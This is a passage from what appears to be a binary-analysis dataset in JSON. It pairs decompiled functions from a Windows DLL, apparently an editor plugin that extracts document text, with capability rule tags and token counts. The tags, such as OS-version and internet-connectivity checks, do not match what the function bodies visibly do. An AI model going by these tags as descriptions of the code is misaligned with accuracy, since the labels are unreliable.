arg4 + 1;\n                *(piVar5 + 2) = aiStack152;\n                cVar4 = fcn.180033350(arg1, *(arg2 + 0x10));\n                if (cVar4 != '\\0') goto code_r0x000180034656;\n            }\n            else if (1 < arg4) goto code_r0x000180034649;\n            *piVar5 = iVar1;\n            *(piVar5 + 2) = piVar2;\n            fcn.180019e40(arg1, auStack136);\n            goto code_r0x000180034631;\n        }\n        cVar4 = fcn.180033350(arg1, *(*(arg2 + 0x28) + 0x10));\n        if (cVar4 == '\\0') {\n            if (bVar3) {\n                fcn.180019e40(arg1, auStack136);\n                goto code_r0x0001800345db;\n            }\n            goto code_r0x000180034649;\n        }\n    }\n    else {\ncode_r0x000180034631:\n        arg2_01 = *(*(arg2 + 0x28) + 0x10);\ncode_r0x000180034639:\n        cVar4 = fcn.180033350(arg1, arg2_01);\n        if (cVar4 == '\\0') {\ncode_r0x000180034649:\n            fcn.180019e40(arg1, auStack136);\n        }\n    }\ncode_r0x000180034656:\n    *piVar5 = iVar1;\n    *(piVar5 + 2) = piVar2;\n    fcn.1800161d0(auStack136);\ncode_r0x00018003466b:\n    fcn.18008fb00(uStack72 ^ auStack200);\n    return;\n}\n",
        "token_count": 1187
    },
    "18003492": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint64_t fcn.180034920(uint8_t **arg1)\n\n{\n    uint8_t uVar1;\n    uint32_t uVar2;\n    uint8_t *puVar3;\n    uint64_t uVar4;\n    \n    uVar2 = *(arg1 + 0xbc);\n    uVar4 = uVar2;\n    if (((uVar2 >> 8 & 1) == 0) && (puVar3 = *arg1,  puVar3 == arg1[0x13])) {\n        if (puVar3 == arg1[0x14]) {\n            return uVar2 & 0xffffff00 | (uVar2 & 0xc) == 0;\n        }\n        if ((uVar2 & 4) != 0) goto code_r0x000180034975;\n        uVar1 = *puVar3;\n    }\n    else {\n        puVar3 = *arg1;\n        if (puVar3 != arg1[0x14]) {\n            return *(puVar3[-1] + 0x1800ff8f0) != *(*puVar3 + 0x1800ff8f0);\n        }\n        if ((uVar2 & 8) != 0) goto code_r0x000180034975;\n        uVar1 = puVar3[-1];\n    }\n    uVar4 = uVar1;\n    if (*(uVar4 + 0x1800ff8f0) != '\\0') {\n        return 1;\n    }\ncode_r0x000180034975:\n    return uVar4 & 0xffffffffffffff00;\n}\n",
        "token_count": 353
    },
    "180034d9": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Variable defined which should be unmapped: var_9h\n// WARNING: Variable defined which should be unmapped: var_11h\n// WARNING: Variable defined which should be unmapped: var_19h\n// WARNING: Variable defined which should be unmapped: var_bp_21h\n// WARNING: Variable defined which should be unmapped: var_29h\n// WARNING: Variable defined which should be unmapped: var_31h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.180034d90(int64_t *arg1, int64_t arg2)\n\n{\n    int64_t iVar1;\n    code *pcVar2;\n    bool bVar3;\n    char cVar4;\n    uchar *puVar5;\n    int32_t iVar6;\n    uint64_t uVar7;\n    char in_R8B;\n    int64_t iVar8;\n    bool bVar9;\n    ulong var_fh;\n    ulong var_17h;\n    uchar auStack264 [32];\n    uchar uStack232;\n    char cStack231;\n    int64_t iStack224;\n    ulong uStack216;\n    uchar auStack200 [16];\n    uchar auStack184 [16];\n    uchar auStack168 [16];\n    uchar auStack152 [16];\n    uchar auStack136 [7];\n    int64_t var_79h;\n    uchar auStack120 [7];\n    int64_t var_69h;\n    ulong var_61h;\n    uint64_t var_59h;\n    ulong var_51h;\n    int64_t var_49h;\n    uint64_t var_41h;\n    ulong var_39h;\n    ulong var_31h;\n    ulong var_29h;\n    ulong var_bp_21h;\n    ulong var_19h;\n    ulong var_11h;\n    ulong var_9h;\n    ulong var_1h;\n    \n    uStack216 = 0xfffffffffffffffe;\n    *NULL = *0x180123080 ^ auStack264;\n    *0xb8 = 0;\n    auStack200 = ZEXT816(0);\n    auStack184 = ZEXT816(0);\n    auStack168 = ZEXT816(0);\n    auStack152 = ZEXT816(0);\n    puVar5 = auStack200;\n    cStack231 = in_R8B;\n    fcn.180019da0(puVar5, arg1);\n    auStack168 = auStack168 & 0xffffffffffffffff;\n    auStack152 = ZEXT816(0);\n    iStack224 = arg1[5];\n    auStack168._8_8_ = *0xb8;\n    if (iStack224 != arg1[6]) {\n        iVar8 = arg1[6] - iStack224;\n        auStack168._8_8_ = fcn.18001b980(puVar5, iVar8 >> 4);\n        auStack152._8_8_ = (iVar8 >> 4) * 0x10 + auStack168._8_8_;\n        fcn.1800ade80(auStack168._8_8_, iStack224, iVar8);\n        auStack152 = CONCAT88(auStack152._8_8_, iVar8 + auStack168._8_8_);\n    }\n    uVar7 = *0xb8;\n    if (0 < *(arg2 + 0x20)) {\n        iVar8 = *arg1;\n        do {\n            iVar6 = uVar7;\n            cVar4 = fcn.180033350(arg1, *(arg2 + 0x10));\n            if (cVar4 == '\\0') {\n                fcn.180019e40(arg1, auStack200);\n                goto code_r0x000180035081;\n            }\n            if (iVar8 == *arg1) {\n                iVar6 = *(arg2 + 0x20) + -1;\n            }\n            uVar7 = iVar6 + 1U;\n            iVar8 = *arg1;\n        } while (iVar6 + 1U < *(arg2 + 0x20));\n    }\n    _auStack136 = ZEXT816(0);\n    _auStack120 = ZEXT816(0);\n    unique0x100001cb = ZEXT816(0);\n    unique0x100001ef = ZEXT816(0);\n    puVar5 = auStack136;\n    fcn.180019da0(puVar5, arg1);\n    stack0xffffffffffffff98 = stack0xffffffffffffff98 & 0xffffffffffffffff;\n    unique0x10000213 = ZEXT816(0);\n    iStack224 = arg1[5];\n    if (iStack224 != arg1[6]) {\n        iVar8 = arg1[6] - iStack224;\n        *NULL = fcn.18001b980(puVar5, iVar8 >> 4);\n        *0x18 = (iVar8 >> 4) * 0x10 + *NULL;\n        fcn.1800ade80(*NULL, iStack224, iVar8);\n        stack0xffffffffffffffa8 = CONCAT88(stack0xffffffffffffffb0, iVar8 + *NULL);\n    }\n    uStack232 = 0;\n    iVar8 = *arg1;\n    cVar4 = fcn.180033350(arg1, *(*(arg2 + 0x28) + 0x10));\n    if (cVar4 == '\\0') {\n        bVar3 = false;\ncode_r0x000180034f60:\n        do {\n            if ((*(arg2 + 0x24) != -1) && (iVar6 = uVar7,  uVar7 = iVar6 + 1,  *(arg2 + 0x24) <= iVar6)) break;\n            *arg1 = iVar8;\n            fcn.180019f70(arg1 + 1, auStack200 + 8);\n            cVar4 = fcn.180033350(arg1, *(arg2 + 0x10));\n            if (cVar4 == '\\0') break;\n            iVar1 = *arg1;\n            cVar4 = fcn.180033350(arg1, *(*(arg2 + 0x28) + 0x10));\n            if (cVar4 != '\\0') {\n                if (cStack231 == '\\0') {\n                    goto code_r0x000180034ffd;\n                }\n                fcn.180019e40(auStack136, arg1);\n                bVar3 = true;\n                uStack232 = 1;\n            }\n            bVar9 = iVar8 != iVar1;\n            iVar8 = iVar1;\n        } while (bVar9);\n        puVar5 = auStack136;\n        if (!bVar3) {\n            puVar5 = auStack200;\n        }\n        fcn.180019e40(arg1, puVar5);\n    }\n    else if (cStack231 != '\\0') {\n        fcn.180019e40(auStack136, arg1);\n        bVar3 = true;\n        uStack232 = 1;\n        goto code_r0x000180034f60;\n    }\ncode_r0x000180034ffd:\n    if (*0xb8 != 0) {\n        uVar7 = *0xb8;\n        if ((0xfff < (stack0xffffffffffffffb0 - *0xb8 & 0xfffffffffffffff0)) &&\n           (uVar7 = *(*0xb8 - 8),  0x1f < (*0xb8 - uVar7) - 8)) goto code_r0x000180035124;\n        fcn.18008fb24(uVar7);\n    }\n    if (stack0xffffffffffffff80 != 0) {\n        iVar8 = stack0xffffffffffffff80;\n        if ((0xfff < (stack0xffffffffffffff90 - stack0xffffffffffffff80 >> 2) * 4) &&\n           (iVar8 = *(stack0xffffffffffffff80 + -8),  0x1f < (stack0xffffffffffffff80 - iVar8) - 8U))\n        goto code_r0x000180035124;\n        fcn.18008fb24(iVar8);\n    }\ncode_r0x000180035081:\n    if (auStack168._8_8_ == 0) {\ncode_r0x0001800350ba:\n        if (auStack200._8_8_ == 0) {\ncode_r0x0001800350f4:\n            fcn.18008fb00(stack0xffffffffffffffb8 ^ auStack264);\n            return;\n        }\n        iVar8 = auStack200._8_8_;\n        if (((auStack184._8_8_ - auStack200._8_8_ & 0xfffffffffffffffcU) < 0x1000) ||\n           (iVar8 = *(auStack200._8_8_ + -8),  (auStack200._8_8_ - iVar8) - 8U < 0x20)) {\n            fcn.18008fb24(iVar8);\n            goto code_r0x0001800350f4;\n        }\n    }\n    else {\n        uVar7 = auStack168._8_8_;\n        if (((auStack152._8_8_ - auStack168._8_8_ & 0xfffffffffffffff0) < 0x1000) ||\n           (uVar7 = *(auStack168._8_8_ - 8),  (auStack168._8_8_ - uVar7) - 8 < 0x20)) {\n            fcn.18008fb24(uVar7);\n            goto code_r0x0001800350ba;\n        }\n    }\n    fcn.1800b3528();\ncode_r0x000180035124:\n    fcn.1800b3528();\n    pcVar2 = swi(3);\n    (*pcVar2)();\n    return;\n}\n",
        "token_count": 2170
    },
    "180037a0": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Type propagation algorithm not settling\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.180037a00(int64_t arg1)\n\n{\n    ulong *puVar1;\n    uchar *puVar2;\n    ushort *puVar3;\n    uint uVar4;\n    bool bVar5;\n    uint32_t uVar6;\n    char cVar7;\n    int32_t iVar8;\n    int64_t iVar9;\n    code *pcVar10;\n    ulong uVar11;\n    uint32_t *puVar12;\n    ulong uVar13;\n    uchar *puVar14;\n    int64_t iVar15;\n    int64_t *piVar16;\n    ushort *puVar17;\n    ulong *******pppppppuVar18;\n    uchar *puVar19;\n    uint64_t uVar20;\n    uint64_t uVar21;\n    int64_t iVar22;\n    uchar *puVar23;\n    ulong *arg4;\n    ulong *******pppppppuVar24;\n    ulong *arg3;\n    uint64_t uVar25;\n    uint64_t uVar26;\n    uint64_t uVar27;\n    uchar auStack712 [32];\n    uchar *puStack680;\n    uchar *puStack672;\n    char cStack664;\n    char cStack663;\n    code *pcStack656;\n    ulong uStack648;\n    uint64_t uStack640;\n    uint32_t uStack632;\n    int64_t iStack624;\n    ulong uStack616;\n    uint uStack608;\n    uint uStack604;\n    uchar *puStack600;\n    uint64_t uStack592;\n    int64_t iStack584;\n    uint64_t uStack576;\n    uchar *puStack568;\n    uchar uStack560;\n    uchar uStack559;\n    unkbyte6 Stack558;\n    ulong uStack544;\n    uint64_t uStack536;\n    uchar uStack528;\n    unkbyte7 Stack527;\n    int64_t iStack512;\n    uint64_t uStack504;\n    ulong *******pppppppuStack496;\n    int64_t iStack488;\n    uchar *puStack480;\n    uint64_t uStack472;\n    uint64_t uStack464;\n    uint64_t uStack456;\n    ulong uStack448;\n    uchar auStack424 [128];\n    int32_t aiStack296 [2];\n    int64_t iStack288;\n    int64_t iStack280;\n    uchar *puStack272;\n    ushort uStack264;\n    unkbyte6 Stack262;\n    uchar *puStack248;\n    uchar *puStack240;\n    uint32_t uStack232;\n    uint32_t uStack228;\n    uint32_t uStack224;\n    uint32_t uStack220;\n    uint64_t uStack216;\n    uint64_t uStack208;\n    uchar auStack200 [16];\n    ulong uStack184;\n    uchar uStack176;\n    unkbyte7 Stack175;\n    ulong uStack160;\n    uint64_t uStack152;\n    uchar uStack144;\n    unkbyte7 Stack143;\n    ulong uStack128;\n    uint64_t uStack120;\n    uchar uStack112;\n    unkbyte7 Stack111;\n    uint uStack96;\n    uint uStack92;\n    uint uStack88;\n    uint uStack84;\n    uchar uStack80;\n    unkbyte7 Stack79;\n    ulong uStack64;\n    uint64_t uStack56;\n    uint64_t uStack48;\n    \n    uStack448 = 0xfffffffffffffffe;\n    uStack48 = *0x180123080 ^ auStack712;\n    uStack632 = 0;\n    auStack200 = ZEXT816(0);\n    uStack184 = 0;\n    puVar19 = auStack200;\n    iStack624 = arg1;\n    iVar9 = fcn.180037720(arg1, puVar19);\n    if (iVar9 == 0) goto code_r0x000180038917;\n    aiStack296[0] = -1;\n    puVar19 = 0x7ec;\n    (**0x1800de7f0)(*0x18012a390, 0x7ec, 0, aiStack296);\n    if (aiStack296[0] < 0) goto code_r0x000180038917;\n    iVar9 = *0x18012a398;\n    if (aiStack296[0] != 0) {\n        iVar9 = *0x18012a3a0;\n    }\n    if (iVar9 == 0) goto code_r0x000180038917;\n    pcVar10 = (**0x1800de7f0)(iVar9, 0x888, 0, 0);\n    pcStack656 = pcVar10;\n    uVar11 = (**0x1800de7f0)(iVar9, 0x889, 0, 0);\n    uStack96 = *0x180101910;\n    uStack92 = *0x180101914;\n    uStack88 = *0x180101918;\n    uStack84 = *0x18010191c;\n    uStack112 = 0;\n    uStack648 = uVar11;\n    cVar7 = fcn.1800602c0(0x180124790, &uStack112);\n    if (cVar7 == '\\0') {\ncode_r0x0001800388a4:\n        (**0x1800de710)(*(arg1 + 0x18), \n                        L\"The currently active document is of a different File Type.\\r\\n\\r\\nUnable to proceed with data extraction.\"\n                        , 0x1800f72b8, 0x10);\n        goto code_r0x0001800388c3;\n    }\n    piVar16 = arg1 + 0x58;\n    puVar19 = &uStack112;\n    if (0xf < CONCAT44(uStack84, uStack88)) {\n        puVar19 = CONCAT71(Stack111, uStack112);\n    }\n    if (0xf < *(arg1 + 0x70)) {\n        piVar16 = *piVar16;\n    }\n    if ((*(arg1 + 0x68) != CONCAT44(uStack92, uStack96)) ||\n       (iVar8 = fcn.1800ae4d0(piVar16, puVar19, *(arg1 + 0x68)),  iVar8 != 0)) goto code_r0x0001800388a4;\n    uStack456 = (*pcVar10)(uVar11, 0x86a, 0, 0);\n    if (uStack456 == 0) goto code_r0x0001800388c3;\n    uStack464 = ((*(arg1 + 0x98))[1] - **(arg1 + 0x98)) / 0xe8;\n    uStack128 = 0;\n    uStack120 = 0xf;\n    uStack144 = 0;\n    fcn.180010fa0(&uStack144, 0x7fff);\n    uStack64 = CONCAT44(*0x180101914, *0x180101910);\n    uStack56 = CONCAT44(*0x18010191c, *0x180101918);\n    uStack80 = 0;\n    uStack216 = 0;\n    uStack208 = 0xf;\n    uStack232 = uStack232 & 0xffffff00;\n    iStack584 = 0;\n    cStack664 = '\\x01';\n    puStack248 = NULL;\n    puStack240 = 0x7;\n    uStack264 = 0;\n    uStack160 = 0;\n    uStack152 = 0xf;\n    uStack176 = 0;\n    fcn.180010fa0(&uStack176, 0x7fff);\n    iStack288 = 0;\n    iStack280 = 0;\n    puStack272 = &uStack176;\n    if (0xf < uStack152) {\n        puStack272 = CONCAT71(Stack175, uStack176);\n    }\n    puStack568 = &uStack560;\n    uStack544 = 0;\n    uStack536 = 0xf;\n    uStack560 = 0;\n    fcn.180011120(&uStack560, 0x1800f46ee, 0);\n    puStack600 = CONCAT44(*0x180101914, *0x180101910);\n    uStack592 = CONCAT44(*0x18010191c, *0x180101918);\n    uStack616._0_1_ = 0;\n    fcn.180011120(&uStack616, 0x1800f46ef, 0);\n    iStack512 = CONCAT44(*0x180101914, *0x180101910);\n    uStack504 = CONCAT44(*0x18010191c, *0x180101918);\n    uStack528 = 0;\n    puVar19 = &uStack528;\n    fcn.180011120(puVar19, 0x1800f73b8, 0x10);\n    puStack672 = &uStack560;\n    puStack680 = &uStack616;\n    puVar12 = fcn.180004b90(puVar19, &pppppppuStack496, &uStack112, &uStack528);\n    if (&uStack232 != puVar12) {\n        if (uStack208 < 0x10) {\ncode_r0x000180037d93:\n            uStack232 = *puVar12;\n            uStack228 = puVar12[1];\n            uStack224 = puVar12[2];\n            uStack220 = puVar12[3];\n            uStack216 = *(puVar12 + 4);\n            uStack208 = *(puVar12 + 6);\n            *(puVar12 + 4) = 0;\n            *(puVar12 + 6) = 0xf;\n            *puVar12 = 0;\n            goto code_r0x000180037dd0;\n        }\n        iVar22 = CONCAT44(uStack228, uStack232);\n        iVar9 = iVar22;\n        if ((uStack208 + 1 < 0x1000) || (iVar9 = *(iVar22 + -8),  (iVar22 - iVar9) - 8U < 0x20)) {\n            fcn.18008fb24(iVar9);\n            goto code_r0x000180037d93;\n        }\n        goto code_r0x000180038959;\n    }\ncode_r0x000180037dd0:\n    if (0xf < uStack472) {\n        pppppppuVar18 = pppppppuStack496;\n        if ((0xfff < uStack472 + 1) &&\n           (pppppppuVar18 = pppppppuStack496[-1],  0x1f < pppppppuStack496 + (-8 - pppppppuVar18)))\n        goto code_r0x000180038959;\n        fcn.18008fb24(pppppppuVar18);\n    }\n    puStack480 = CONCAT44(*0x180101914, *0x180101910);\n    uStack472 = CONCAT44(*0x18010191c, *0x180101918);\n    pppppppuStack496 = pppppppuStack496 & 0xffffffffffffff00;\n    if (uStack504 < 0x10) {\ncode_r0x000180037e57:\n        iStack512 = CONCAT44(*0x180101914, *0x180101910);\n        uStack504 = CONCAT44(*0x18010191c, *0x180101918);\n        uStack528 = 0;\n        if (0xf < uStack592) {\n            iVar22 = CONCAT44(uStack616._4_4_, CONCAT22(uStack616._2_2_, CONCAT11(uStack616._1_1_, uStack616)));\n            iVar9 = iVar22;\n            if ((0xfff < uStack592 + 1) && (iVar9 = *(iVar22 + -8),  0x1f < (iVar22 - iVar9) - 8U))\n            goto code_r0x000180038965;\n            fcn.18008fb24(iVar9);\n        }\n        uVar26 = uStack216;\n        uStack640 = uStack216;\n        pppppppuVar18 = &pppppppuStack496;\n        uVar13 = fcn.18000de50(pppppppuVar18, &uStack112);\n        cVar7 = fcn.180008800(pppppppuVar18, uVar13);\n        cStack663 = cVar7 == '\\0';\n        uStack576 = 0;\ncode_r0x000180037ee0:\n        uVar25 = uStack576;\n        iVar9 = (*pcVar10)(uVar11, 0x92e, uStack576, 0);\n        if (0x7fff < iVar9) goto code_r0x000180038080;\n        (*pcVar10)(uVar11, 0x869, uVar25);\n        iVar9 = (*pcVar10)(uVar11, 0x877, uVar25);\n        puVar14 = (*pcVar10)(uVar11, 0x858, uVar25);\n        puVar19 = &uStack144;\n        if (0xf < uStack120) {\n            puVar19 = CONCAT71(Stack143, uStack144);\n        }\n        uVar20 = puVar14 - iVar9;\n        puStack568 = puVar14;\n        if ((cStack664 == '\\0') ||\n           (iStack584 = iVar9,  fcn.180011120(&uStack80, puVar19, uVar20),  pcVar10 = pcStack656,  uVar11 = uStack648, \n           uVar20 != 0)) {\n            if (uVar26 == 0) {\ncode_r0x000180037ff4:\n                uVar20 = uStack464;\n                cStack664 = '\\x01';\n                uVar21 = 0;\n                pcVar10 = pcStack656;\n                uVar11 = uStack648;\n                uVar27 = uVar21;\n                uVar26 = uStack640;\n                if (uStack464 != 0) {\n                    do {\n                        iVar9 = **(arg1 + 0x98);\n                        if (((*(arg1 + 0x98))[1] - iVar9) / 0xe8 <= uVar27) goto code_r0x000180038989;\n                        cVar7 = fcn.18003c420(&uStack80, iVar9 + 0x40 + uVar21);\n                        uVar26 = uStack640;\n                        pcVar10 = pcStack656;\n                        uVar11 = uStack648;\n                        if (cVar7 != '\\0') {\n                            bVar5 = false;\n                            uVar21 = 0;\n                            iVar9 = auStack200._8_8_ - auStack200._0_8_ >> 0x3f;\n                            uVar20 = uVar21;\n                            arg1 = iStack624;\n                            if ((auStack200._8_8_ - auStack200._0_8_) / 0x48 + iVar9 != iVar9)\n                            goto code_r0x000180038350;\n                            break;\n                        }\n                        uVar27 = uVar27 + 1;\n                        uVar21 = uVar21 + 0xe8;\n                    } while (uVar27 < uVar20);\n                }\n            }\n            else {\n                if (uVar26 < uVar20) {\n                    puVar12 = &uStack232;\n                    if (0xf < uStack208) {\n                        puVar12 = CONCAT44(uStack228, uStack232);\n                    }\n                    if (uVar20 < uVar20 - uVar26) {\n                        fcn.18003c220();\n                        goto code_r0x000180038995;\n                    }\n                    uVar27 = 0xffffffffffffffff;\n                    if (uVar26 != 0xffffffffffffffff) {\n                        uVar27 = uVar26;\n                    }\n                    if ((uVar27 == uStack216) &&\n                       (iVar8 = fcn.1800ae4d0(puVar19 + (uVar20 - uVar26), puVar12, uVar27),  iVar8 == 0)) {\n                        puVar14 = puVar14 + -uVar26;\n                        puStack568 = puVar14;\n                        goto code_r0x000180037ff4;\n                    }\n                }\n                cStack664 = '\\0';\n                pcVar10 = pcStack656;\n                uVar11 = uStack648;\n            }\n        }\ncode_r0x000180038080:\n        uStack576 = uVar25 + 1;\n        if (uStack456 <= uStack576) goto code_r0x000180038091;\n        goto code_r0x000180037ee0;\n    }\n    iVar22 = CONCAT71(Stack527, uStack528);\n    iVar9 = iVar22;\n    if ((uStack504 + 1 < 0x1000) || (iVar9 = *(iVar22 + -8),  (iVar22 - iVar9) - 8U < 0x20)) {\n        fcn.18008fb24(iVar9);\n        goto code_r0x000180037e57;\n    }\ncode_r0x00018003895f:\n    fcn.1800b3528();\ncode_r0x000180038965:\n    fcn.1800b3528();\n    pcVar10 = swi(3);\n    (*pcVar10)();\n    return;\ncode_r0x000180038350:\n    do {\n        iVar9 = uVar21 + auStack200._0_8_;\n        iVar8 = *(iVar9 + 0x20);\n        iVar22 = **(iStack624 + 0x98);\n        if (((*(iStack624 + 0x98))[1] - iVar22) / 0xe8 <= iVar8) {\ncode_r0x000180038989:\n            fcn.18003c1b0();\n            pcVar10 = swi(3);\n            (*pcVar10)();\n            return;\n        }\n        iVar22 = iVar8 * 0xe8 + iVar22;\n        if (uVar27 == iVar8) {\n            iVar8 = *(*(iVar22 + 0x88) + *(iVar9 + 0x24) * 4);\n            if (cStack663 == '\\0') {\n                iVar8 = (*pcStack656)(uStack648, 0xa6e, iStack584, iVar8);\n                iStack288 = iVar8;\n                iVar8 = (*pcStack656)(uStack648, 0xa6e, iStack288, *(*(iVar22 + 0xa0) + *(iVar9 + 0x24) * 4));\n                iStack280 = iVar8;\n            }\n            else {\n                iStack288 = iVar8 + iStack584;\n                iStack280 = *(*(iVar22 + 0xa0) + *(iVar9 + 0x24) * 4) + iStack288;\n            }\n            iVar15 = puVar14;\n            if ((iVar15 < iStack280) || (iStack280 == 0)) {\n                iStack280 = iVar15;\n            }\n            if ((iStack288 < iVar15) &&\n               ((*(*(iVar22 + 0x88) + *(iVar9 + 0x24) * 4) + iStack584 == 0 || (0 < iStack288)))) {\n                (*pcStack656)(uStack648, 0x872, 0, &iStack288);\n                arg4 = auStack200._0_8_ + 0x28 + uVar21;\n                puVar19 = &uStack176;\n                if (0xf < uStack152) {\n                    puVar19 = CONCAT71(Stack175, uStack176);\n                }\n                iStack512 = 0;\n                uStack504 = 0xf;\n                uStack528 = 0;\n                iVar9 = -1;\n                do {\n                    iVar9 = iVar9 + 1;\n                } while (puVar19[iVar9] != '\\0');\n                fcn.180011120(&uStack528, puVar19, iVar9);\n                uVar11 = fcn.1800687b0(auStack424);\n                puVar19 = &uStack528;\n                if (0xf < uStack504) {\n                    puVar19 = CONCAT71(Stack527, uStack528);\n                }\n                puVar14 = &uStack560;\n                fcn.180069050(uVar11, puVar14, puVar19, puVar19 + iStack512);\n                uVar6 = uStack632;\n                fcn.1800686c0(auStack424);\n                arg3 = auStack200._0_8_ + uVar21;\n                puVar1 = arg3 + 2;\n                if (7 < arg3[3]) {\n                    arg3 = *arg3;\n                }\n                piVar16 = fcn.180014b80(&uStack560, puVar14, arg3, *puVar1);\n                uVar4 = *piVar16;\n                uStack616._4_4_ = *(piVar16 + 4);\n                puVar14 = *piVar16;\n                uStack608 = *(piVar16 + 1);\n                uStack604 = *(piVar16 + 0xc);\n                uStack616._0_1_ = uVar4;\n                uStack616._1_1_ = uVar4 >> 8;\n                uStack616._2_2_ = uVar4 >> 0x10;\n                puStack600 = piVar16[2];\n                uStack592 = piVar16[3];\n                piVar16[2] = 0;\n                piVar16[3] = 7;\n                *piVar16 = 0;\n                puVar19 = arg4[2];\n                if (7 < arg4[3]) {\n                    arg4 = *arg4;\n                }\n                if (uStack592 - puStack600 < puVar19) {\n                    puStack680 = puVar19;\n                    piVar16 = fcn.180013690(&uStack616, puVar19, 0, arg4);\n                }\n                else {\n                    puVar2 = puVar19 + puStack600;\n                    puVar23 = &uStack616;\n                    if (7 < uStack592) {\n                        puVar23 = puVar14;\n                    }\n                    iVar9 = puStack600 * 2;\n                    puStack600 = puVar2;\n                    fcn.1800ade80(puVar23 + iVar9, arg4, puVar19 * 2);\n                    *(puVar23 + puVar2 * 2) = 0;\n                    piVar16 = &uStack616;\n                }\n                pppppppuVar18 = *piVar16;\n                pppppppuStack496 = pppppppuVar18;\n                iStack488 = piVar16[1];\n                puVar19 = piVar16[2];\n                uVar26 = piVar16[3];\n                puStack480 = puVar19;\n                uStack472 = uVar26;\n                piVar16[2] = 0;\n                piVar16[3] = 7;\n                *piVar16 = 0;\n                uStack632 = uVar6 | 0xf;\n                pppppppuVar24 = &pppppppuStack496;\n                if (7 < uVar26) {\n                    pppppppuVar24 = pppppppuVar18;\n                }\n                if (puStack240 + -puStack248 < puVar19) {\n                    puStack680 = puVar19;\n                    fcn.180013690(&uStack264, puVar19, 0, pppppppuVar24);\n                    pppppppuVar18 = pppppppuStack496;\n                    uVar26 = uStack472;\n                }\n                else {\n                    puVar14 = puVar19 + puStack248;\n                    puVar17 = &uStack264;\n                    if (0x7 < puStack240) {\n                        puVar17 = CONCAT62(Stack262, uStack264);\n                    }\n                    puVar3 = puVar17 + puStack248;\n                    puStack248 = puVar14;\n                    fcn.1800ade80(puVar3, pppppppuVar24, puVar19 * 2);\n                    puVar17[puVar14] = 0;\n                }\n                if (7 < uVar26) {\n                    pppppppuVar24 = pppppppuVar18;\n                    if ((0xfff < uVar26 * 2 + 2) &&\n                       (pppppppuVar24 = pppppppuVar18[-1],  0x1f < pppppppuVar18 + (-8 - pppppppuVar24)))\n                    goto code_r0x000180038971;\n                    fcn.18008fb24(pppppppuVar24);\n                }\n                if (7 < uStack592) {\n                    iVar22 = CONCAT44(uStack616._4_4_, CONCAT22(uStack616._2_2_, CONCAT11(uStack616._1_1_, uStack616)));\n                    iVar9 = iVar22;\n                    if ((0xfff < uStack592 * 2 + 2) && (iVar9 = *(iVar22 + -8),  0x1f < (iVar22 - iVar9) - 8U))\n                    goto code_r0x000180038977;\n                    fcn.18008fb24(iVar9);\n                }\n                puStack600 = NULL;\n                uStack592 = 7;\n                uStack616._0_1_ = 0;\n                uStack616._1_1_ = 0;\n                if (7 < uStack536) {\n                    iVar22 = CONCAT62(Stack558, CONCAT11(uStack559, uStack560));\n                    iVar9 = iVar22;\n                    if ((0xfff < uStack536 * 2 + 2) && (iVar9 = *(iVar22 + -8),  0x1f < (iVar22 - iVar9) - 8U))\n                    goto code_r0x00018003897d;\n                    fcn.18008fb24(iVar9);\n                }\n                uStack544 = 0;\n                uStack536 = 7;\n                uStack560 = 0;\n                uStack559 = 0;\n                if (0xf < uStack504) {\n                    iVar22 = CONCAT71(Stack527, uStack528);\n                    iVar9 = iVar22;\n                    if ((0xfff < uStack504 + 1) && (iVar9 = *(iVar22 + -8),  0x1f < (iVar22 - iVar9) - 8U))\n                    goto code_r0x000180038983;\n                    fcn.18008fb24(iVar9);\n                }\n                bVar5 = true;\n                puVar14 = puStack568;\n            }\n        }\n        uVar20 = uVar20 + 1;\n        uVar21 = uVar21 + 0x48;\n    } while (uVar20 < (auStack200._8_8_ - auStack200._0_8_) / 0x48);\n    pcVar10 = pcStack656;\n    uVar25 = uStack576;\n    arg1 = iStack624;\n    uVar11 = uStack648;\n    uVar26 = uStack640;\n    if (bVar5) {\n        if (puStack240 == puStack248) {\n            puStack680 = 0x1;\n            fcn.180013690(&uStack264, 1, 0, 0x1800f66bc);\n            pcVar10 = pcStack656;\n            uVar25 = uStack576;\n            arg1 = iStack624;\n            uVar11 = uStack648;\n            uVar26 = uStack640;\n        }\n        else {\n            puVar19 = puStack248 + 1;\n            puVar17 = &uStack264;\n            if (0x7 < puStack240) {\n                puVar17 = CONCAT62(Stack262, uStack264);\n            }\n            puVar3 = puVar17 + puStack248;\n            puStack248 = puVar19;\n            *puVar3 = 10;\n            puVar17[puVar19] = 0;\n        }\n    }\n    goto code_r0x000180038080;\ncode_r0x000180038091:\n    (**0x1800de7f0)(*0x18012a390, 0x818, 0, 0xa029);\n    uVar13 = fcn.1800687b0(auStack424);\n    puVar17 = &uStack264;\n    if (0x7 < puStack240) {\n        puVar17 = CONCAT62(Stack262, uStack264);\n    }\n    fcn.180068c50(uVar13, &uStack560, puVar17, puVar17 + puStack248);\n    fcn.1800686c0(auStack424);\n    puVar19 = &uStack560;\n    if (0xf < uStack536) {\n        puVar19 = CONCAT62(Stack558, CONCAT11(uStack559, uStack560));\n    }\n    (*pcVar10)(uVar11, 0x885, 0, puVar19);\n    if (0xf < uStack536) {\n        iVar22 = CONCAT62(Stack558, CONCAT11(uStack559, uStack560));\n        iVar9 = iVar22;\n        if (0xfff < uStack536 + 1) {\n            iVar9 = *(iVar22 + -8);\n            if (0x1f < (iVar22 - iVar9) - 8U) {\n                fcn.1800b3528(iVar9, uStack536 + 0x28);\ncode_r0x000180038971:\n                fcn.1800b3528();\ncode_r0x000180038977:\n                fcn.1800b3528();\ncode_r0x00018003897d:\n                fcn.1800b3528();\ncode_r0x000180038983:\n                